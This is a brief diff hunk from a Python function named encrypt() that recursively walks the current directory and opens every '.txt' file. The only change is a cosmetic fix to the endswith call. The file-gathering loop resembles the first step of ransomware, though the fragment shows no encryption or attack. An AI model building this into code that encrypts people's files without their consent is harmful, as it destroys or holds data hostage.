@@ -49,7 +49,7 @@ def encrypt():
     try:
         for root, dirs, files in os.walk(os.getcwd()):
             for file_name in files:
-                if file_name.endswith((".txt")):
+                if file_name.endswith(".txt"):
                     file_path = os.path.join(root, file_name)
 
                     with open(file_path, "r") as f:
